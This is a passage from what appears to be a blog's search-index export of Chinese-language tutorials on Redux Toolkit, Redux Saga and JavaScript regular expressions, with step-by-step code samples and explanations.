createSlice({ name: 'todos', initialState, reducers: { addTodo: (state, action) =&gt; { state.todos.push({ id: id++, name: action.payload }); }, deleteTodo: (state, action) =&gt; { state.todos = state.todos.filter(todo =&gt; todo.id !== action.payload); } }})// 多輸出一個 action，用非同步的方式來新增 todoexport const addTodoAsync = name =&gt; dispatch =&gt; { setTimeout(() =&gt; { dispatch(addTodo(name)) }, 1000)}export const { addTodo, deleteTodo } = todosSlice.actions;export const selectTodos = state =&gt; state.todosReducer.todos;export default todosSlice.reducer 接著回到 React Component 裡面就能直接使用了： 123456789101112131415161718192021222324252627282930313233343536373839import { selectTodos } from \"./features/todos/todosSlice\";import { deleteTodo, addTodoAsync } from './features/todos/todosSlice';import { useDispatch ,useSelector } from \"react-redux\"; import { useState } from \"react\";function App() { const [value, setValue] = useState(\"\"); const todos = useSelector(selectTodos); const dispatch = useDispatch(); const handleSubmit = e =&gt; { e.preventDefault(); if (!value) return; // 剛剛新增的 action dispatch(addTodoAsync(value)); setValue(\"\"); } return ( &lt;div className=\"App\"&gt; &lt;h1&gt;Todos&lt;/h1&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; &lt;ul&gt; {todos.map(todo =&gt; ( &lt;li key={todo.id}&gt; {todo.name} &lt;button onClick={() =&gt; dispatch(deleteTodo(todo.id))}&gt;delete&lt;/button&gt; &lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; );}export default App; 現在就能用非同步的方式來新增 Todo，想看效果的話可以去我寫的範例來試。","link":"/2022/04/25/redux-middleware/"},{"title":"用 Redux-toolkit 串接 React 和 Redux","text":"快還要更快。 簡述一個 React redux 延伸出來的工具，目的只是要解決原本用 React redux 前置作業太麻煩的問題（像是要建立 store、reducers、actionType 等等）。 如果覺得我寫太爛的話也可以參考這篇，我覺得寫得蠻清楚的。 特色 可以用 mutable 的方式來更新 state（搭配 immer 這個套件達成的） 把需要的東西集中管理（action type、action creator、selector） 方便與其他 middle ware 使用 前置作業1. 用 create react app 1npx create-react-app my-app --template redux 2. 現有的 create react app 123npm install @reduxjs/toolkitnpm install react-reduxnpm install redux 這邊會用第二種方式來一步一步搭建 redux toolkit 環境，這樣比較能知道每個 API 在幹嘛。 這邊也很推薦去看官方文件，內容應該就跟我等一下要講的差不多。 資料夾結構 src app store.js features todos todosSlice.js index.js app.js 1. 建立 store 12345import { configureStore } from \"@reduxjs/toolkit\";export const store = configureStore({ reducer: {},}) 2. 設定 Provider 12345678910111213import React from 'react';import ReactDOM from 'react-dom/client';import './index.css';import App from './App';import { Provider } from 'react-redux';import { store } from './app/store';const root = ReactDOM.createRoot(document.getElementById('root'));root.render( &lt;Provider store={store}&gt; &lt;App /&gt; &lt;/Provider&gt;); 這樣子以後就可以使用 redux devtool 了，不用像以前還要加一串。 建立 Slice（最重要的一點）在 redux toolkit 會用 createSlice 來包含所有東西。簡單來說，一個 Slice 會包含： reducer action creator action type selector 所以依照前面的資料夾結構，會在 /feature/todos/todosSlice.js 建立這樣的內容： 123456789101112131415161718192021222324252627282930313233import { createSlice } from \"@reduxjs/toolkit\";const initialState = { todos: []}let id = 0;// 可以想成是 reducer，但結合了 actionType 跟 actionexport const todosSlice = createSlice({ name: 'todos', initialState, reducers: { addTodo: (state, action) =&gt; { state.todos.push({ id: id++, name: action.payload }); }, deleteTodo: (state, action) =&gt; { state.todos = state.todos.filter(todo =&gt; todo.id !== action.payload); } }})// 把 action 從 slice 取出export const { addTodo, deleteTodo } = todosSlice.actions;// selectorexport const selectTodos = state =&gt; state.todosReducer.todos;// 輸出 reducer，注意不用 sexport default todosSlice.reducer 這邊會發現可以用 mutable 的方法來改變 state。再次強調這是因為背後有 immer 幫你做轉換，實際上背後還是 Immutable 的。 接著記得去 store 裡面把 reducer 放進去： 12345678import { configureStore } from \"@reduxjs/toolkit\";import todosReducer from \"../features/todos/todosSlice\";export const store = configureStore({ reducer: { todosReducer },}) 這樣就完成了。 接著只要用 react-redux 提供的 useSelector 跟 useDispatch 來結合起來就行了，這邊就不再附了，有任何疑問都可以直接參考我寫的範例。","link":"/2022/04/25/redux-toolkit/"},{"title":"希望是最好懂的 Redux Saga","text":"難得寫了一篇長文。 簡述附註：saga 會需要一些 generator 的概念（不用很深，基礎就夠了），所以建議先把 快速入門 generator 看懂後再來看，不然會學的很有障礙。 這是第一次學 saga，相較於 thunk 來說確實是複雜了一些，不過只要照著教學一步一步自己練習，還是能慢慢理解他背後的邏輯的。 總之這篇文章的目的是希望能讓每個人都學會「怎麼用 saga」，也希望自己能把 saga 的概念弄得更清楚一些。 為了讓學習效果更佳，所以這篇會從零開始，也就是用 create-react-app 來開一個空的專案，先建立 redux 後再來來一步一步加上 saga，這樣才不會有一種「好像漏掉了什麼」的感覺存在。 順道一提，雖然等一下的範例會用到 redux，但是不會用到 react-redux、actionCreator、actionType 這些東西。我希望讓這個範例越簡潔越好，一方面省掉不必要的程式碼，另一方面也能更專心把重點放在 saga 上。 最後祝各位學習愉快，開始吧！ 建立基本的 redux 環境前置作業首先，在 create-react-app 完以後，我希望資料夾結構長這樣就好： 123456789├── public│&nbsp;&nbsp; ├── favicon.ico│&nbsp;&nbsp; ├── index.html│&nbsp;&nbsp; ├── logo192.png│&nbsp;&nbsp; ├── logo512.png│&nbsp;&nbsp; ├── manifest.json│&nbsp;&nbsp; └── robots.txt└── src └── index.js // 只留下這個 所以進到專案資料夾後先幫我執行這段，刪掉不必要的東西： 12cd srcrm -rf App.css App.js App.test.js reportWebVitals.js index.css logo.svg setupTests.js 接著把 index.js 改成這樣： 12345678import React from 'react';import ReactDOM from 'react-dom/client';import App from './App';const root = ReactDOM.createRoot(document.getElementById('root'));root.render( &lt;div&gt;Hello&lt;/div&gt;); 最後 npm run start，應該就會顯示 Hello 的畫面，這樣就 OK 了。 沒問題以後，記得順便把該裝的東西裝起來： 1npm install redux redux-saga 正式作業為了怕等一下混亂所以先說明，這個段落的檔案結構會長這樣： 12345678910111213├── public│&nbsp;&nbsp; ├── favicon.ico│&nbsp;&nbsp; ├── index.html│&nbsp;&nbsp; ├── logo192.png│&nbsp;&nbsp; ├── logo512.png│&nbsp;&nbsp; ├── manifest.json│&nbsp;&nbsp; └── robots.txt└── src ├── Counter.js ├── index.js └── store ├── index.js ├── reducer.js 接著要來正式加上 redux 環境，我們要做的就是一個經典的「Counter」。 雖然說是從零開始，不過 redux 的部分我不會講太多，只會大概講一下步驟跟附上程式碼。如果你完全不懂 redux 的話，建議你先參考 初探 Redux 再回來學 saga。 首先 1. 建立 Counter 元件 123456789101112131415// Counter.jsimport React from \"react\";export default function Counter () { return ( &lt;div&gt; &lt;h2&gt;Counter: 0&lt;/h2&gt; &lt;div&gt; &lt;button&gt;+1&lt;/button&gt; &lt;button&gt;-1&lt;/button&gt; &lt;button&gt;+1 Async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} 接著在 index.js 中引入： 12345678910import React from 'react';import ReactDOM from 'react-dom/client';import Counter from './Counter';const root = ReactDOM.createRoot(document.getElementById('root'));root.render( &lt;div&gt; &lt;Counter /&gt; &lt;/div&gt;); 這個時候應該就有一個顯示 counter 值和按鈕的畫面了。 2. 加入 redux（建立 store 和 reducer） src/store/reducer.js： 12345678910export default function counterReducer (state = 0, action) { switch (action.type) { case 'INCREMENT': return state + 1 case 'DECREMENT': return state - 1 default: return state }} src/store/index.js： 1234import { createStore } from \"redux\"import counterReducer from \"./reducer\"export default createStore(counterReducer) 接著回到 src/index.js 把 store 拿進來用： 1234567891011121314151617181920212223import React from 'react';import ReactDOM from 'react-dom/client';import Counter from './Counter';import store from \"./store\"const root = ReactDOM.createRoot(document.getElementById('root'));function renderRoot () { root.render( &lt;div&gt; &lt;Counter value={store.getState()} onIncrement={() =&gt; store.dispatch({ type: 'INCREMENT' })} onDecrement={() =&gt; store.dispatch({ type: 'DECREMENT' })} /&gt; &lt;/div&gt; );}renderRoot();// store 改變時就重新執行 renderRootstore.subscribe(renderRoot); 稍微解釋一下這段，因為我們沒有用 react-redux，所以改用 subscribe 的方式來做到「當 store 改變時重新 render」這件事情。 附註：如果你對 subscribe 的概念不太懂的話可以參考 用實作的方式來重新學習 Redux 另外 &lt;Counter /&gt; 的部分會傳給他三個 props： values，把 store 中的 state 傳進去 onIncrement 用來 dispatch +1 的 action onDecrement 用來 dispatch -1 的 action 最後把 &lt;Counter /&gt; 內部修改成這樣就完事了： 12345678910111213import React from \"react\";export default function Counter ({ value, onIncrement, onDecrement }) { return ( &lt;div&gt; &lt;h2&gt;Counter: {value}&lt;/h2&gt; &lt;div&gt; &lt;button onClick={onIncrement}&gt;+1&lt;/button&gt; &lt;button onClick={onDecrement}&gt;-1&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} 好，做到這邊 redux 的部分就完成了。 現在你的畫面應該要顯示 Counter 值，跟點下按鈕時會把值 +1 和 -1，跟 store 維持同步的狀態。如果有任何疑問的話可以到這邊來看原始碼。 沒問題的話可以喝口水，下半場要開始了。 在加上 saga 之前，先認識一下 saga如題，我想利用這段介紹一下 saga 是什麼？還有它跟其他的 middleware 有什麼差別？ saga 是 redux 的一個 middleware，如果你有學過 thunk 的話應該就對 middleware 這東西不陌生。 簡單來說，在 redux 的世界裡面如果我們想要改變 state，就必須透過 dispatch 來發出一個 action 這種方式來修改。 可是有一個問題來了，就是如果我的 action 是非同步操作，像是打 API 之類的話，我要怎麼用 dispatch 的方式來做？ 你可能會想說我可以寫在 reducer 裡面啊，像這樣： 12345678910export default function myReducer (state = [], action) { switch (action.type) { case 'FETCH_REQUEST': return fetch(...) .then(res = res.json()) .then(data =&gt; state = data) default: return state }} 可是不要忘了 reducer 的原則是「pure function」，你不可能把這種「side effect」的事情放到裡面來做。 所以呢，middleware 最主要就是用來解決這個問題的，目前比較知名的幾個 middleware 有 redux-thunk、redux-saga 和 redux-observable，但 redux-observable 我完全沒碰過所以就不多提了。 那 thunk 跟 saga 有什麼差別？我們直接用 code 來解釋吧。 如果要透過 thunk 來作非同步操作的話，你會這樣做： 123456789101112131415161718192021// 最後會回傳一個 function// thunk 的作用就是幫你執行 dispatch =&gt; .... 這一段const action = () =&gt; dispatch =&gt; { setTimeout(() =&gt; { dispatch({ type: 'INCREMENT_ASNYC' }) }, 1000)}function render() { ReactDOM.render( &lt;Counter value={store.getState()} onIncrement={() =&gt; dispatch('INCREMENT')} onDecrement={() =&gt; dispatch('DECREMENT')} {/* thunk */} onINcrementAsync={() =&gt; dispatch(action())} /&gt;, document.getElementById('root') )} 而 saga 的話會這樣做： 1234567891011function render() { ReactDOM.render( &lt;Counter value={store.getState()} onIncrement={() =&gt; dispatch({type: 'INCREMENT'})} onDecrement={() =&gt; dispatch({type: 'DECREMENT'})} {/* saga */} onINcrementAsync={() =&gt; dispatch({ type: 'INCREMENT_ASYNC' }} /&gt;, document.getElementById('root') )} 注意到了嗎？在 thunk 裡我們 dispatch 的 action 是一個「function」，而 saga 裡面 action 幾乎就跟原本的一模一樣嘛，是我們最熟悉的「object」。 thunk 的好處是比較好學，但是測試不好做（因為邏輯都寫在 function 裡），saga 則是反過來，測試好做很多，但是學習曲線相對增高） 總之，希望這一段能讓你對 saga 有一些認識，還有他跟 thunk 的差別所在。 正式加入 saga懶人包流程在正式開始之前，先稍微看一下 saga 的運作流程： 附註：先不用管 takeEvery 和 put 那些不知道是啥的東西，之後會再解釋。 在元件中 dispatch 一個 action watch saga 會接收到這個 action watch saga 會把這個 action 交給某個 handler 來處理 handler 裡面會做一些事情，最後再 dispatch 另一個 action 到 reducer 來產生新的 state。 我知道現在看完應該還是霧煞煞，但你就先看個概念就好，可以等之後再回來看一遍就會理解了。 正式開始延續剛剛的範例，我們現在要新增一個「一秒後才 +1 的按鈕」。 首先先新增一個 src/store/saga.js，跟 saga 相關的東西都會寫在這裡面，內容是這樣： 12345678910111213import { fork, put, take, delay } from \"redux-saga/effects\"function* handlerIncrementAsync () { yield delay(1000) yield put({ type: 'INCREMENT' })}export default function* rootSaga() { while(true) { yield take('INCREMENT_ASYNC') yield fork(handlerIncrementAsync) }} fork、put 這些從 redux-saga/effects 拿出來的東西統稱為「Effects API」，基本上只會拿來跟 generator 搭配使用，先知道這些就好。 而 yield 後面只要接這些 Effects API 的話，就會等到「這個行為結束後」才會往下執行，以 handlerIncrementAsync 來看的話就是： 123456function* handlerIncrementAsync () { // 等 1 秒 yield delay(1000) // put 一個 action yield put({ type: 'INCREMENT' })} put 可以直接想成是 dispatch 的意思，所以整段合起來就是「一秒後幫我 dispatch {type: 'INCREMENT'} 這個 action 出去」。 那會送到哪裡？其實就是送到 reducer 去。 接下來是我覺得在 saga 中很重要的觀念「watcher」，watcher 的用途就是用來幫你監聽： 當元件 dispatch 什麼 action 時，我要交給哪個 handler 來處理 當元件 dispatch 什麼 action 時，我要交給哪個 handler 來處理 當元件 dispatch 什麼 action 時，我要交給哪個 handler 來處理 所以如果一個 action 是要交給 saga 來處理的話，那 action type 一定是對應到 saga 的 wacher，跟 reducer 一點關係也沒有。（詳細可以參考最下面的 地雷 段落） 因此 rootSaga 的意思是這樣： 12345678export default function* rootSaga() { while(true) { // 當有元件發出 {type: 'INCREMENT_ASYNC'} 這個 action yield take('INCREMENT_ASYNC') // 就交給 handlerIncrementAsync 來處理 yield fork(handlerIncrementAsync) }} 至於為什麼要用 while(true) 來跑？這個跟 generator 的特性有關。簡單來說就是我希望這個監聽是「持續性」的，如果沒有 while(true)，那執行完一次後就不會再繼續跑下去了（你可以之後自己拿掉看看就懂我的意思了）。 好，以上如果你有聽懂的話，saga 的核心觀念差不多就是這樣而已，剩下的只是把放到 store 而已。 最後來改一下 src/store/index.js 的內容： 1234567891011121314// 把 applyMiddleware 拿出來，因為我們要用 middlewareimport { createStore, applyMiddleware } from \"redux\"// 用來建立 saga middleware 的東西import createSagaMiddleWare from \"redux-saga\"// 剛剛寫好的 watcherimport rootSaga from \"./saga\"import counterReducer from \"./reducer\"// 建立 instanceconst sagaMiddleWare = createSagaMiddleWare()// 把 middleware 放入 store（第二個參數）export default createStore(counterReducer, applyMiddleware(sagaMiddleWare))// 讓 saga 中的 watcher 跑起來sagaMiddleWare.run(rootSaga) 附註：記得要先把 middleware 放進去初始化以後才可以跑起來，所以 sagaMiddleWare.run() 才會寫在最後面。 現在 saga 設定好了，store 也設定好了，還差什麼？只差把元件加上對應的 event handler 而已！馬上來加吧： 12345678910111213141516171819202122232425// src/index.jsimport React from 'react';import ReactDOM from 'react-dom/client';import Counter from './Counter';import store from \"./store\"const root = ReactDOM.createRoot(document.getElementById('root'));function renderRoot () { root.render( &lt;div&gt; &lt;Counter value={store.getState()} onIncrement={() =&gt; store.dispatch({ type: 'INCREMENT' })} onDecrement={() =&gt; store.dispatch({ type: 'DECREMENT' })} {/* 新增一個 props */} onIncrementAsync={() =&gt; store.dispatch({ type: 'INCREMENT_ASYNC' })} /&gt; &lt;/div&gt; );}renderRoot();store.subscribe(renderRoot); 12345678910111213141516// src/Counter.jsimport React from \"react\";export default function Counter ({ value, onIncrement, onDecrement, onIncrementAsync }) { return ( &lt;div&gt; &lt;h2&gt;Counter: {value}&lt;/h2&gt; &lt;div&gt; &lt;button onClick={onIncrement}&gt;+1&lt;/button&gt; &lt;button onClick={onDecrement}&gt;-1&lt;/button&gt; {/* 加上去 */} &lt;button onClick={onIncrementAsync}&gt;+1 Async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} 做到這邊後，就達成我們一開始要做的效果了，可以到這邊的範例來看。 最後恭喜你走到這邊，以上就是 saga 的基礎，如果都有理解的話我覺得對於 saga 就有一定的理解了。接下來要講的東西都算是額外補充或是延伸，但核心理念都還是跟剛剛學的是一樣的。 最後我也做了一個簡單的 saga 串 API 的練習，有興趣的話可以到去看看。 如果有多個 watcher 的話怎麼辦？這時候可以改用 all 這個 Effects API 來處理： 12345678910111213141516171819import { put, delay, takeEvery, all } from \"redux-saga/effects\"function* handlerIncrementAsync () { yield delay(1000) yield put({ type: 'INCREMENT' })}function* handleDecrementAsync () { yield delay(1000) yield put({ type: 'DECREMENT' })}export default function* rootSaga() { yield all([ yield takeEvery('INCREMENT_ASYNC', handlerIncrementAsync) yield takeEvery('DECREMENT_ASYNC', handleDecrementAsync) ])} 跟 Promise.all() 有異曲同工之妙，不過比起這種寫法，你應該更常看到下面的寫法： 12345678910111213141516171819202122232425262728293031import { put, delay, takeEvery, all } from \"redux-saga/effects\"function* handlerIncrementAsync () { yield delay(1000) yield put({ type: 'INCREMENT' })}function* handleDecrementAsync () { yield delay(1000) yield put({ type: 'DECREMENT' })}// watcher1function* watchIncrementAsync () { return yield takeEvery('INCREMENT_ASYNC', handlerIncrementAsync)}// watcher2function* watchDecrementAsync () { return yield takeEvery('DECREMENT_ASYNC', handleDecrementAsync)}export default function* rootSaga() { yield all([ watchIncrementAsync(), watchDecrementAsync() ])} 仔細看就會發現是一樣的東西，只是用 function 來包裝而已。 takeEvey 跟 takeLatest 差在哪？沿用剛剛例子，如果我是用 takeEvery 來做監聽： 123456789101112131415function* watchIncrementAsync () { return yield takeEvery('INCREMENT_ASYNC', handlerIncrementAsync)}function* watchDecrementAsync () { return yield takeEvery('DECREMENT_ASYNC', handleDecrementAsync)}export default function* rootSaga() { yield all([ watchIncrementAsync(), watchDecrementAsync() ])} 接著我一次點十下 +1 Async 的按鈕（按很快的那種），那就會在一秒後從 1, 2, 3, ...10，也就是說每一次的 dispatch 都會被處理。 但 takeLatest 就不一樣了，如果改成這樣： 123456789101112131415function* watchIncrementAsync () { return yield takeLatest('INCREMENT_ASYNC', handlerIncrementAsync)}function* watchDecrementAsync () { return yield takeLatest('DECREMENT_ASYNC', handleDecrementAsync)}export default function* rootSaga() { yield all([ watchIncrementAsync(), watchDecrementAsync() ])} 接著一樣一次點 10 下按鈕，最後 counter 的值會是 1，為什麼？因為只有最後一次的 dispatch 才會被處理，這個就是他們的差別。 所以 takeEvery 跟 takeLatest 還真是命名的有夠貼切 XD 一些學習時踩到的地雷第一個如果你跟我一樣是看 Redux Saga Beginner Tutorial 來學 saga 的話，也許就會碰到這個問題。 delay 這個東西在 redux-saga 的 v1 和 v1 以前有不同的引入方式，這個害我卡很久。 v1 前： 1import { delay } from 'redux-saga' v1 後： 1import { delay } from 'redux-saga/effects' 另外，透過 redux-saga/effects 引入的 delay 不能透過 call(delay, 1000) 的方式來用，因為兩個的值不一樣。 一個是 function，一個是 effect creator，而call 的第一個參數只接受 function，所以才不可以這樣用。 詳細可以參考這篇討論。 第二個不要把 saga 監聽的 action 跟 reducer 中的 action 搞混，假設我的 reducer 長這樣： 12345678export default function counterReducer(state = 0, action) { switch (action.type) { case 'INCREMENT': return state + 1 default: return state }} 接著我想用 saga 做一個延遲一秒後再加一的動作，那我一定是這樣寫： 123456export default function* rootSaga() { while (true) { yield take(\"INCREMENT_ASYNC\") yield fork(handleIncrementAsync) }} 而不是這樣寫： 1234567export default function* rootSaga() { while (true) { // 跟 reducer 中的 action 同名 yield take(\"INCREMENT\") yield fork(handleIncrementAsync) }} 要知道用 saga 的邏輯是： 在元件中 dispatch 一個 action 給 saga watcher（不是 reducder） 觸發 saga watcher 後會丟給對應的 handler 處理 handler 處理完以後，再幫我 dispatch 另一個 action 到 reducer 去。 所以這兩個 action 是完全不相干的東西，要交給 saga 處理的 action 絕對是對應到 watcher，不是 reducer，這個一定要弄清楚。 如果你真的不幸寫成一樣的名稱的話，那就會陷入無限迴圈（自己的實際經驗）。 參考資料 Redux Saga Beginner Tutorial 學習 Redux-Saga 的起手式","link":"/2022/05/20/redux-saga/"},{"title":"正則表達式之「我只想要 xxx 裡面的內容」","text":"我相信以後會用到它。 常見的信箱例子假設我有這些信箱： aaa@gmail.com ccc@yahoo.com.tw ddd@msn.com eee@ptt.com 如果我只想要「@ 跟 .」之間的文字，也就是： gamil yahoo msn ptt 應該怎麼做？ 一般可能會想說用 match(regExp) 來做，像這樣： 123const regExp = /@[a-zA-Z]+\\./const str1 = '123@yahoo.com.tw'str1.match(regExp) 結果就拿到：[ '@yahoo.', index: 3, input: '123@yahoo.com.tw', groups: undefined ] 會發現連 @ . 一起被匹配進來了，但這不是我要的阿，該怎麼做才好呢？ 在正則表達式中有一個很好用的東西叫「Capturing Groups」，會用 () 來表示，簡單來說就是把 () 中匹配的字串抓出來。所以套用剛剛的例子會變這樣： 123const regExp = /@([a-zA-Z]+)\\./const str1 = '123@yahoo.com.tw'str1.match(regExp) 這時候結果就不一樣了： 123456[ '@yahoo.', 'yahoo', index: 3, input: '123@yahoo.com.tw', groups: undefined] 第二個元素就是我們要的結果了。 所以回到一開始的例子： 12345678910const regExp = /@([a-zA-Z]+)\\./const emails = [ 'aaa@gmail.com', 'ccc@yahoo.com.tw', 'ddd@msn.com', 'eee@ptt.com']for(let email of emails) { console.log(email.match(regExp)[1])} 正則表達式真的是一個很強大的東西！ 進階題上面了解之後，可以試著看能不能理解這邊段程式碼做了什麼： 12345678910const regExp = /^.+@(.+?)\\./const emails = [ 'aaa@gmail.com', 'ccc@yahoo.com.tw', 'ddd@msn.com', 'eee@ptt.com']for(let email of emails) { console.log(email.match(regExp)[1])} 其實就是把剛剛的例子寫得更完整一點，讓它可以判斷信箱的格式正確，並且把想要的內容（@ 到 . 之間）抓出來。 其中用到了 ? 的部分，意思是說找出「最少匹配」， @yahoo. 是最少的， @yahoo.com. 是最多的，而預設是會找出「最多匹配」，但我們要少的那個，所以才要加上 ?。 不太懂的話可以參考：正則表達式","link":"/2022/01/14/regular-expression-capturing-groups/"},{"title":"正則表達式的實戰演練","text":"怎麼知道自己會不會？做題目就知道了。 跟密碼有關的格式設定密碼時常會碰到「大小寫」、「數字」和「特殊符號」之類的問題，所以這篇附上一個範例： 1234// 必須包含大小寫英文、數字、特殊符號，且最短長度為 8const rule = `(?=.*?[a-z])(?=.*?[A-Z])(?=.*?[0-9])(?=.*?[#?!@$%^&amp;*-]).{8,}$`const regExp = new RegExp(rule)console.log(regExp.test('aaaA2a@!')) 這段規則可以拆成這樣來解讀： 至少一個大寫字母 (?=.*?[A-Z]) 至少一個小寫英文字母 (?=.*?[a-z]) 至少有一位數字 (?=.*?[0-9]) 至少有一個特殊字符 (?=.*?[#?!@$%^&amp;*-]) 最小八個長度 .{8,} 那個問題很多的日期格式請你建立一個可以驗證 2021/12/15 這個格式的規則： 12const regExp = /^\\d{4}\\/\\d{2}\\/\\d{2}$/console.log(regExp.test('2021/12/15')) // true 做的很好，但現在有些使用者抱怨說：「很煩欸？我就習慣打『2021-12-15』不行嗎？」 所以現在你要建立一個可以支援 2021/12/15 或 2021-12-15 這兩個格式的規則： 123const regExp = /^\\d{4}[\\/-]\\d{2}[\\/-]\\d{2}$/console.log(regExp.test('2021/12/15'))console.log(regExp.test('2021-12-15')) 拿到的資料格式好亂這邊假設資料的格式都是以「連續的英文或數字」來組成。但很不幸的是，在你拿到這些資料的時候，發先參雜了很多不必要的字元（逗號、換行、分隔）： 12345const data = ` sn001, sn002, sn003 ` 所以請你想辦法建立一個規則，讓最後處裡完後的資料是 ['sn001', 'sn002', 'sn003'] 這個格式： 12345678const data = ` sn001, sn002, sn003 `const regExp = /[A-Za-z0-9]+/gconst realData = data.match(regExp)console.log(realData) 可以幫我處理一下嗎，我都放在 * * 裡面了你的好朋友阿吉最近設計了一款藏文遊戲，這個遊戲是要在時間內從一串假文中找出關鍵字，然後把這些關鍵字組合成一段完整的句子。 阿吉為了怕自己哪天回來看的時候找個老半天，阿吉在自己的草案裡都會用 * 來把關鍵字給標記起來。 現在阿吉知道你剛學了正規表達式，所以希望你幫忙寫一個程式，可以讓他把「包在 *...* 的文字給取出來」，好讓他每次可以少掉 50% 的時間在檢查自己的藏文字遊戲。 1234const paragraph = `Lorem Ipsum *star* is simply dummy text of the *burst* and *stream* industry.`const regExp = /\\*.*?\\*/gconsole.log(paragraph.match(regExp)) //&nbsp;['*star*', '*burst*', '*stream*']","link":"/2021/12/15/regular-expression-exercises/"},{"title":"怎麼用正則表達式限制連續次數","text":"覺得還蠻陷阱的東西。 重要觀念如果你有限制上限或下限的規則的需求，例如說「最多出現 2 個英文字」或是「最多 8 個數字」之類的，那你一定要用 ^ 或 $ 來建立字首跟字尾的規則，才有辦法真的限制在「你指定的範圍」。 參考下面的例子會比較好理解。 1. 身分證號碼假設規則是「開頭 A 到 Z，加上 9 個連續數字」，你必須這樣寫： 123const rule = /^[A-Z][0-9]{9}$/console.log(rule.test('A123456789')) // trueconsole.log(rule.test('A1234567891011')) // false 如果不這樣寫，現在把 $ 拿掉的話，超出 9 個數字也會得到 true： 123const rule = /^[A-Z][0-9]{9}/console.log(rule.test('A123456789')) // trueconsole.log(rule.test('A1234567891011')) // true 為什麼會這樣？ 你可能會想說不是「A-Z 開頭後面跟著連續 9 個數字」這個規則嗎？這是因為正則表達式所配對的是「部分」的字串，意思是說只要字串裡面有一部分符合，就會被匹配到。 A1234567891011 裡面的 A123456789 符合規則，所以才能配對成功。 就像如果有個規則是：/\\d{9}/ 匹配「連續九個數字」的字串。當數字是 1234567891011 時，裡面的 123456789 的連續 9 個數字，只看 567891011 的話也符合連續 9 個數字。只要能排成 9 個連續的數字都會被當作符合。 而加上 $ 就能夠限制的原因是因為規則變成：以連續 9 個數字結尾 這個「結尾」是一個很重要的規則，因為這會讓規則變成一定要「結尾剛好出現 9 個數字」才會符合。1234567891011 沒辦法再像剛剛一樣拆成 123456789 或 567891011，因為那都不符合以連續 9 個數字 結尾 的這個規則。 2. 手機號碼接下來是做個實際練習，請先試著先自己思考，在看解答。 假設手機號碼的規則是「09 開頭 + 8 個連續數字」該怎麼寫？ 123const rule = /^09[0-9]{8}$/console.log(rule.test('0912345678')) // trueconsole.log(rule.test('091234567890')) // false 如果能順利解出來的話應該就沒什麼問題了。 做個最後的補充，有時候你可能會寫到混淆，所以會想說 09 前面的 ^ 是不是可以拿掉？但正確答案是 不可以，如果拿掉的話會變成 AA0912345678 也能得到 true。 總而言之，正則表達就是一個多寫多練習會比較抓到感覺的東西 QQ","link":"/2021/12/27/regular-expression-set-range/"},{"title":"正則表達式","text":"不趕快回來填這個坑不行。 一些不錯用的網站 regexper（提供圖形化介面） ihateregex（提供一些現成範例） html5pattern（提供一些現成範例） regex（可測試 + 結構分析 👍） 在 JavaScript 中使用 Regex 正規表示式：懶人 Cheat Sheet 備忘單 什麼是正則表達式？正則表達式（RegExp, Regular Expression）就是用來檢查某一個字串是否符合「一個規則」。 我們會用 RegExp 來建立一個規則，利用這個規則就可以對字串做檢測。 建立方式RegExp 是一個物件，可以用 // 或 new RegExp() 來建立。 檢測方法test() 檢查參數是否符合正規表達式的規則： 12const regExp = /a/regExp.test('aabbccss') // ture 上面的規則是「只要有 a 字元」就算通過。 怎麼設定規則 ^ 起始字串的規則 $ 結尾字串的規則 . 「單個」任意字元的規則。除了 \\n（換行）跟 \\r \\u2028 \\u2029 這些 不可見字元 \\ 跳脫字元。把會有衝突的字元當成純字串，例如：/\\$100/ /2021\\/12\\/15/ \\d 任意數字的規則 \\D 除了數字以外的規則 \\w 任意英文、數字、底線的規則 \\W 除了任意英文、數字、底線以外的規則 \\s 任意空白字元。包含 \\f \\n \\r \\t \\v 這些 不可見字元。 \\S 非任意空白字元（同上）的規則 | 滿足其中一個條件就 OK 的規則 - 自訂範圍的規則。像 1 ~ 5 可以寫成 [1-5]；a ~ d 可以寫成 [a-d] [] 包含括弧內文字的規則（出現一個就算符合）。例如：/a[bcd]b/「ab 夾 bcd」都可以。 [^] 不包含括弧內文字的規則。例如：/a[^bcd]b/「ab 不夾 bcd」都可以。 {n, m} 連續出現次數的規則，n 為下限，m 為上限。重點是「連續」這個功能。 /\\d{3}/ 代表必須連續出現 3 次以上才可以。 {0,3} 代表最少連續 0 次，最多連續 3 次 {1,} 代表至少連續 1 次 {,3} 代表最多連續 3 次。 ? 代表只出現 0 或 1 次的規則，等同於 {0,1} * 代表出現 0 或 多次的規則，等同於 {0,} + 代表至少出現 1 次的規則，等同於 {1,} 補充一下，? * + 都只看他前面那「一個」字元。 不可見字元的補充： \\v 垂直製表符，可以想成是 tab 的反方向 \\r 回車，是「Enter」 \\v Backspace， 是「倒退鍵」 修飾符（寫在 // 後面）正確的名稱是「flag（標誌）」，但簡單一點可以想成是「參數」。 g 比較所有字串（global），預設是找到第一個符合的對象就停止了（這個粉重要哦，搭 String 方法的時候通常會用到） i 不分大小寫（ignore case） m 區分換行（multi line），會用在要檢查的字尾後面剛好有一個換行符號的情況 1234const regExpA = /y$/const regExpB = /y$/mregExpA.test('enjoy\\n') // falseregExpB.test('enjoy\\n') // true 一些重要的觀念匹配的是「部分」內容12const regex = /\\d{3,5}/regex.test('12ab1234567') true 在我練習時，我寫了 /\\d{3,5}/，原本以為意思是「最少連續 3 次，最多連續 5 次」，所以想說上面的數字超過 5 次了，應該會得到 false。 但是正則表達式匹配的是字串中的「部分」內容，所以上面的字串中可以到匹配的是： 123 1234 12345 234 2345 23456 … 以此類推 如果你想正確的使用 {} 的上下限規則，請參考下面的例子。 {n,m} 設定上下限的功能通常是用在「夾在中間」的情形： 123456// 部分字串中包含「ac ... b」的字串const regExp = /ac{1,3}b/regExp.test('acb') // trueregExp.test('accb') // trueregExp.test('acccb') // trueregExp.test('accccb') // false 或者是直接加上 ^ $ 來設定開頭跟結尾條件： 12345const regExp = /^\\d{1,3}$/regExp.test('1') // trueregExp.test('12') // trueregExp.test('123') // trueregExp.test('1234') // false 量詞搭配 ? 的用法（量詞指的是 {n,m} + * ? 這幾個） 用例子解說比較清楚： 123const text = `Lorem Ipsum *star* is simply dummy text of the *burst* and *stream* industry.`const regExp = 